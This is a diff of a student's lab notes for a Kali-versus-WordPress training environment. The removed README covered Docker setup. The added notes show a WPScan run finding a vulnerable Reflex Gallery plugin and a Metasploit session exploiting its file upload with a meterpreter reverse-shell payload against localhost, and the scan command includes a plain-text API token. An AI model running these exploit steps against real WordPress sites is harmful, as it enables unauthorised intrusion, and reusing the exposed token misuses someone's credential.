@@ -1,95 +1,295 @@
-# wpVSkali
-Docker Implementation of a Vagrant/Vbox setup for CodePath
+Milestone 1: Plugin was downloaded and installed
+Milestine 2: 
 
-## Installing Docker
+              ┌──(root💀kali)-[/home/kali/Desktop/wpVSkali]
+              └─# wpscan --url http://localhost:8080 --api-token JMa8ESXowqf250XWDyth47svm2Q5JeCnRolIDaOktMU                                                                                                                 5 ⨯
+              _______________________________________________________________
+                      __          _______   _____
+                      \ \        / /  __ \ / ____|
+                        \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+                        \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+                          \  /\  /  | |     ____) | (__| (_| | | | |
+                          \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 
-- For Mac OSX
-  Using the installer at this [link](https://docs.docker.com/docker-for-mac/install/) installs all the components necessary for this exercise.
-- For Windows
-  The installer at this [link](https://docs.docker.com/docker-for-windows/install/) includes all the necessary components.
-- For Linux Distros
-  Follow the distro specific instructions for the [Docker Engine](https://docs.docker.com/engine/install/) and for [Docker Compose](https://docs.docker.com/compose/install/). There is no GUI included for Linux, and if needed install [Portainer](https://documentation.portainer.io/v2.0/deploy/ceinstalldocker/), an open source application which can help view and manage containers.
+                      WordPress Security Scanner by the WPScan Team
+                                      Version 3.8.17
+                    Sponsored by Automattic - https://automattic.com/
+                    @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+              _______________________________________________________________
 
-## Build
-Build the image for Kali and make a folder to bind to the Wordpress container
+              [+] URL: http://localhost:8080/ [::1]
+              [+] Started: Sat Aug 28 02:00:02 2021
 
-```bash
-DOCKER_BUILDKIT=1 docker compose build
-mkdir wpFolder
-```
+              Interesting Finding(s):
 
-## Run Wordpress(+mysql) and Kali containers
+              [+] Headers
+              | Interesting Entries:
+              |  - Server: Apache/2.4.25 (Debian)
+              |  - X-Powered-By: PHP/7.2.13
+              | Found By: Headers (Passive Detection)
+              | Confidence: 100%
 
-- ```bash
-  docker compose up -d
-  ID=$(docker ps -a | grep kaliCP | gawk '{print $1}') && docker exec -it $ID bash
-  ```
-- Second command opens a terminal with root privileges on Kali Linux and has the same network accessibility as the host machine.
-- Both on the host machine and on the Kali terminal, the WordPress website is accessible at http://localhost:8080
-- Note to self: xargs doesn't work with docker exec since it doesn't allocate a tty for the piped input, thus usage of a shell variable is necessary.
+              [+] XML-RPC seems to be enabled: http://localhost:8080/xmlrpc.php
+              | Found By: Direct Access (Aggressive Detection)
+              | Confidence: 100%
+              | References:
+              |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+              |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+              |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+              |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+              |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
 
-- Type `exit` to exit the Kali bash shell and to shutdown all running containers use,
+              [+] WordPress readme found: http://localhost:8080/readme.html
+              | Found By: Direct Access (Aggressive Detection)
+              | Confidence: 100%
 
-  ```bash
-  docker compose down
-  ```
+              [+] The external WP-Cron seems to be enabled: http://localhost:8080/wp-cron.php
+              | Found By: Direct Access (Aggressive Detection)
+              | Confidence: 60%
+              | References:
+              |  - https://www.iplocation.net/defend-wordpress-from-ddos
+              |  - https://github.com/wpscanteam/wpscan/issues/1299
 
-- This command removes all the containers and the network created. All named volumes are retained and they provide persistence.
+              [+] WordPress version 5.8 identified (Latest, released on 2021-07-20).
+              | Found By: Rss Generator (Passive Detection)
+              |  - http://localhost:8080/?feed=rss2, <generator>https://wordpress.org/?v=5.8</generator>
+              |  - http://localhost:8080/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.8</generator>
 
-- When changing the version of WordPress, the db name volume needs to be removed by running
+              [+] WordPress theme in use: twentytwentyone
+              | Location: http://localhost:8080/wp-content/themes/twentytwentyone/
+              | Latest Version: 1.4 (up to date)
+              | Last Updated: 2021-07-22T00:00:00.000Z
+              | Readme: http://localhost:8080/wp-content/themes/twentytwentyone/readme.txt
+              | Style URL: http://localhost:8080/wp-content/themes/twentytwentyone/style.css?ver=1.4
+              | Style Name: Twenty Twenty-One
+              | Style URI: https://wordpress.org/themes/twentytwentyone/
+              | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
+              | Author: the WordPress team
+              | Author URI: https://wordpress.org/
+              |
+              | Found By: Css Style In Homepage (Passive Detection)
+              |
+              | Version: 1.4 (80% confidence)
+              | Found By: Style (Passive Detection)
+              |  - http://localhost:8080/wp-content/themes/twentytwentyone/style.css?ver=1.4, Match: 'Version: 1.4'
 
-  ```bash
-  docker volume rm wpvskali_db
-  ```
+              [+] Enumerating All Plugins (via Passive Methods)
+              [+] Checking Plugin Versions (via Passive and Aggressive Methods)
 
-- And then the folder, 'wpFolder' should be emptied using
+              [i] Plugin(s) Identified:
 
-  ```bash
-  rm -rf wpFolder && mkdir wpFolder
-  ```
+              [+] reflex-gallery
+              | Location: http://localhost:8080/wp-content/plugins/reflex-gallery/
+              | Last Updated: 2021-03-10T02:38:00.000Z
+              | [!] The version is out of date, the latest version is 3.1.7
+              |
+              | Found By: Urls In Homepage (Passive Detection)
+              |
+              | [!] 2 vulnerabilities identified:
+              |
+              | [!] Title: Reflex Gallery <= 3.1.3 - Arbitrary File Upload
+              |     Fixed in: 3.1.4
+              |     References:
+              |      - https://wpscan.com/vulnerability/c2496b8b-72e4-4e63-9d78-33ada3f1c674
+              |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4133
+              |      - https://www.exploit-db.com/exploits/36374/
+              |      - https://packetstormsecurity.com/files/130845/
+              |      - https://packetstormsecurity.com/files/131515/
+              |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload/
+              |
+              | [!] Title: Multiple Plugins - jQuery prettyPhoto DOM Cross-Site Scripting (XSS)
+              |     Fixed in: 3.1.5
+              |     References:
+              |      - https://wpscan.com/vulnerability/ad9df355-9928-411c-8b09-f9969d7cf449
+              |      - https://blog.anantshri.info/forgotten_disclosure_dom_xss_prettyphoto
+              |      - https://github.com/scaron/prettyphoto/issues/149
+              |      - https://github.com/wpscanteam/wpscan/issues/818
+              |
+              | Version: 3.1.3 (80% confidence)
+              | Found By: Readme - Stable Tag (Aggressive Detection)
+              |  - http://localhost:8080/wp-content/plugins/reflex-gallery/readme.txt
 
-- WordPress version can be changed by editing the docker-compose.yml file, and the tag for WordPress image
-  ```yaml
-  image: wordpress
-  ```
-  becomes one of the older versions tagged and available [here](https://hub.docker.com/_/wordpress?tab=tags&page=1&ordering=-last_updated)
-  ```yaml
-  image: "wordpress:4.1.0"
-  ```
+              [+] Enumerating Config Backups (via Passive and Aggressive Methods)
+              Checking Config Backups - Time: 00:00:00 <====================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00
 
-- WordPress Time Machine - Recreating Image Upload Vuln. in WP 4.1
-  - Screenshot 1 ![WpScan output](/images/wpTMvuln.png)
-  - Screenshot 2 ![Vulnerability POC recreated](/images/vulnPOC.png)
+              [i] No Config Backups Found.
+
+              [+] WPScan DB API OK
+              | Plan: free
+              | Requests Done (during the scan): 0
+              | Requests Remaining: 22
+
+              [+] Finished: Sat Aug 28 02:00:07 2021
+              [+] Requests Done: 141
+              [+] Cached Requests: 41
+              [+] Data Sent: 35.653 KB
+              [+] Data Received: 21.854 KB
+              [+] Memory used: 213.254 MB
+              [+] Elapsed time: 00:00:05
 
 
 
-  ---
-  **NOTE**
+Milestone 3:
 
-  For WordPress to create a correct bind-mount, ensure that the folder containing its compose file has a directory named 'wpFolder'
+            msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > db_status
+            [*] Connected to msf. Connection type: postgresql.
 
-  ---
-## Sources:
-  - [Link 1](https://github.com/thibaudrobin/docker-kali-light)
-  - ... Add others ...
 
-## TO-DO:
-**_NOTE:_**  Tick off as done [ ] -> [x]
 
-- [ ] Create a Makefile to clean the wpFolder and remove the named volume whenever the user wishes (i.e. allowing easy change of WP versions)
 
-- [ ] Push image to Docker Hub and reduce build times on user end. Specifically the Kali image since it is static once built.
+Milestone 4:
 
-- [ ] Instructions for localhost:8080 to be mapped to a hostname, links for ideas (might require reverse-proxying with nginx?)
-  - [Link 1](https://serverfault.com/questions/574116/hostname-to-localhost-with-port-osx)
-  - [Link 2](https://superuser.com/questions/1192774/can-i-map-a-ip-address-and-a-port-with-etc-hosts) This link has a Windows soln. too.
-  - [Link 3](https://www.baeldung.com/linux/mapping-hostnames-ports)
 
-- [ ] A more robust networking interface between Kali and WordPress (i.e. Kali doesn't need host networking as it does now) or use a docker dns proxy, links for ideas and caveats.
-  - [Link 1](https://github.com/oliverwiegers/pentest_lab) - The ideal configuration.
-  - [Link 2](https://github.com/hiroshi/docker-dns-proxy)
-  - [Link 3](https://github.com/docker/compose/issues/2925)
+          > Executing “sudo msfdb init && msfconsole”
+          [sudo] password for kali: 
+          [i] Database already started
+          [i] The database appears to be already configured, skipping initialization
+                                                            
+          IIIIII    dTb.dTb        _.---._
+            II     4'  v  'B   .'"".'/|\`.""'.
+            II     6.     .P  :  .' / | \ `.  :
+            II     'T;. .;P'  '.'  /  |  \  `.'
+            II      'T; ;P'    `. /   |   \ .'
+          IIIIII     'YvP'       `-.__|__.-'
 
-- [ ] Cross-Platform compatibility ~ Testing on Windows
+          I love shells --egypt
 
-- [ ] Testing Lab from Week 8 - Metasploit on Kali.
+
+                =[ metasploit v6.0.40-dev                          ]
+          + -- --=[ 2119 exploits - 1138 auxiliary - 360 post       ]
+          + -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+          + -- --=[ 8 evasion                                       ]
+
+          Metasploit tip: Use help <command> to learn more 
+          about any command
+
+          msf6 > search Reflex
+
+          Matching Modules
+          ================
+
+            #  Name                                              Disclosure Date  Rank       Check  Description
+            -  ----                                              ---------------  ----       -----  -----------
+            0  exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability
+
+
+          Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_reflexgallery_file_upload
+
+          msf6 > use xploit/unix/webapp/wp_reflexgallery_file_upload
+          [*] No payload configured, defaulting to php/meterpreter/reverse_tcp                                                     
+                                                                                                                                                                
+          Matching Modules                                                                                                                                      
+          ================                                                                                                                                      
+                                                                                                                                                                
+            #  Name                                              Disclosure Date  Rank       Check  Description                                                
+            -  ----                                              ---------------  ----       -----  -----------                                                     
+            0  exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability                   
+                                                                                                                                                                          
+                                                                                                                                                                          
+          Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_reflexgallery_file_upload                                          
+                                                                                                                                                                              
+          [*] Using exploit/unix/webapp/wp_reflexgallery_file_upload                                                                                                          
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > use exploit/unix/webapp/wp_reflexgallery_file_upload                                                       
+          [*] Using configured payload php/meterpreter/reverse_tcp                                                                                                            
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOST localhost:8080                                                                                    
+          RHOST => localhost:8080
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
+
+          [-] Exploit failed: One or more options failed to validate: RHOSTS.
+          [*] Exploit completed, but no session was created.
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > search Reflex
+
+          Matching Modules
+          ================
+
+            #  Name                                              Disclosure Date  Rank       Check  Description
+            -  ----                                              ---------------  ----       -----  -----------
+            0  exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability
+
+
+          Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_reflexgallery_file_upload
+
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > use 0
+          [*] Using configured payload php/meterpreter/reverse_tcp
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOST localhost:8080
+          RHOST => localhost:8080
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set LHOST 127.0.0.1
+          LHOST => 127.0.0.1
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
+
+          [-] Exploit failed: One or more options failed to validate: RHOSTS.
+          [*] Exploit completed, but no session was created.
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > 
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set LHOST kali:8080
+          LHOST => kali:8080
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
+
+          [-] Exploit failed: One or more options failed to validate: RHOSTS.
+          [*] Exploit completed, but no session was created.
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOSTS localhost:8080
+          RHOSTS => localhost:8080
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
+
+          [-] Exploit failed: One or more options failed to validate: RHOSTS.
+          [*] Exploit completed, but no session was created.
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOSTS localhost
+          RHOSTS => localhost
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
+          [*] Exploiting target {:address=>"0.0.0.1", :hostname=>"localhost"}
+
+          [-] Exploit failed: One or more options failed to validate: LHOST.
+          [*] Exploiting target {:address=>"127.0.0.1", :hostname=>"localhost"}
+          [-] Exploit failed: One or more options failed to validate: LHOST.
+          [*] Exploit completed, but no session was created.
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set LHOST localhost
+          LHOST => localhost
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
+          [*] Exploiting target {:address=>"0.0.0.1", :hostname=>"localhost"}
+
+          [!] You are binding to a loopback address by setting LHOST to ::1. Did you want ReverseListenerBindAddress?
+          [*] Started reverse TCP handler on ::1:4444 
+          [-] Exploit aborted due to failure: unknown: Server did not respond in an expected way
+          [*] Exploiting target {:address=>"127.0.0.1", :hostname=>"localhost"}
+          [!] You are binding to a loopback address by setting LHOST to ::1. Did you want ReverseListenerBindAddress?
+          [*] Started reverse TCP handler on ::1:4444 
+          [-] Exploit aborted due to failure: unknown: Server did not respond in an expected way
+          [*] Exploit completed, but no session was created.
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set LHOST 127.0.0.1
+          LHOST => 127.0.0.1
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOSTS 127.0.0.1
+          RHOSTS => 127.0.0.1
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
+
+          [!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+          [*] Started reverse TCP handler on 127.0.0.1:4444 
+          [-] Exploit aborted due to failure: unknown: Server did not respond in an expected way
+          [*] Exploit completed, but no session was created.
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set LPORT 8080
+          LPORT => 8080
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RPORT 8080
+          RPORT => 8080
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
+
+          [!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+          [-] Handler failed to bind to 127.0.0.1:8080:-  -
+          [-] Handler failed to bind to 0.0.0.0:8080:-  -
+          [-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080).
+          [*] Exploit completed, but no session was created.
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOSTS locahost
+          RHOSTS => locahost
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set LHOST localhost
+          LHOST => localhost
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
+
+          [-] Exploit failed: One or more options failed to validate: RHOSTS.
+          [*] Exploit completed, but no session was created.
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOSTS kali
+          RHOSTS => kali
+          msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
+
+          [!] You are binding to a loopback address by setting LHOST to ::1. Did you want ReverseListenerBindAddress?
+          [*] Started reverse TCP handler on ::1:8080 
+          [+] Our payload is at: ZhvOTbvx.php. Calling payload...
+          [*] Calling payload...
+          [!] This exploit may require manual cleanup of 'ZhvOTbvx.php' on the target
+          [*] Exploit completed, but no session was created.
